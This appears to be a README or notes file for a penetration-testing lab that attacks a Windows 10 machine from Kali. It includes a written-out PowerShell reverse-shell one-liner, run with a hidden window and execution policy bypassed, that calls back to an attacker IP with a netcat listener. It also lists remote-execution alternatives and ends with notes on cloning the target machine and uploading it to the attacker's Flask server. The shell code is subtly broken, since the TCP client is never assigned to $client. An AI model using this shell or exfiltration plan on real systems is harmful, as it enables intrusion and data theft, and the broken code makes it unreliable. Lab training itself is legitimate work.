Pentesting Exercise
This is a pentesting exercise designed to test your knowledge and skills in different areas related to cybersecurity. The exercise covers different topics including network scanning, vulnerability assessment, web application testing, and exploitation techniques.

Requirements
Kali Linux machine (attacker machine)
Windows 10 machine (target machine)
Basic knowledge of Linux and Windows operating systems
Basic knowledge of networking and cybersecurity concepts
Basic knowledge of programming and scripting languages (Python, PowerShell)
Setup
Install Kali Linux on your attacker machine and Windows 10 on your target machine.
Configure network settings to enable communication between the two machines.
Install the required tools and applications for the exercise including nmap, Metasploit, Burp Suite, and Flask.
Clone or download the necessary files and scripts for the exercise.
Exercise Steps
Network Scanning: Use nmap to scan the target machine for open ports and services.
Vulnerability Assessment: Use Metasploit to perform a vulnerability assessment on the target machine and identify potential exploits.
Web Application Testing: Use Burp Suite to perform a web application assessment on the target machine and identify potential vulnerabilities.
Exploitation: Use Metasploit and other tools to exploit identified vulnerabilities and gain access to the target machine.
Reverse Shells: Use reverse shells to establish a persistent connection with the target machine and execute remote commands.
File Transfer: Use SCP or HTTP upload to transfer files and directories between the attacker and target machines.
Exercise Objectives
Identify open ports and services on a target machine.
Identify potential vulnerabilities on a target machine.
Exploit identified vulnerabilities to gain access to a target machine.
Establish a persistent connection with a target machine using reverse shells.
Transfer files and directories between the attacker and target machines.
Exercise Conclusion
This pentesting exercise provides a practical learning experience to enhance your knowledge and skills in different areas related to cybersecurity.
 It covers different aspects of the penetration testing process including network scanning, vulnerability assessment, web application testing, and exploitation techniques. By completing this exercise, you will have a better understanding of the tools, techniques, and methodologies used in real-world penetration testing scenarios.





REVERSE SHELL INFORMATION
You can establish a reverse shell without an executable file by using built-in tools or scripting languages available on the target system. Here are a few examples:

PowerShell reverse shell:

powershell
Copy code
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('<attacker_ip>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
Replace <attacker_ip> with the attacker's IP address. On the attacker's machine, start a listener using nc -lvp 4444.

REVERSE SHELL ALTERNATIVE OPTIONS: 
SSH (Secure Shell): Setting up an SSH server on the target Windows 10 machine and using an SSH client from the attacking machine to establish a secure shell connection. Windows 10 has a built-in OpenSSH server that you can enable and configure.

RDP (Remote Desktop Protocol): Windows 10 has a built-in RDP server that you can enable and configure, allowing you to access the target machine's desktop and execute commands using an RDP client.

WinRM (Windows Remote Management): WinRM is a Windows native remote management protocol that allows you to execute PowerShell commands remotely. You can configure WinRM on the target machine and use the Enter-PSSession or Invoke-Command cmdlets on the attacking machine to execute commands remotely.

psexec (from Sysinternals Suite): PsExec is a command-line tool that allows you to execute processes on remote systems. You can use PsExec to run a command prompt or PowerShell on the target machine.

WMIC (Windows Management Instrumentation Command-line): WMIC is a command-line interface to WMI, which allows you to manage and interact with local and remote systems. You can use WMIC to execute commands remotely on a target machine.

NETCAT REVERSE SHELL:
Last resort 


IDEA: Why not just send a clone of the target machine to the attacker's machine and scrape it there?
Run Packet capturing and MITM incase the FLASK connection drops and deletes the clone so we have a backup of the data.
We will need something like multithreading and some sort of seperator to upload different directories at different times or just do it in steps. 
SEE: 
If a Flask server is already running on your Kali machine, you can add an endpoint to handle file uploads. 
To modify your Flask application to allow the upload of large files, you can set the maximum content length allowed for file uploads.
 Also, it is a good idea to use a streaming approach when saving files especially when dealing with large files to prevent your server from running out of memory
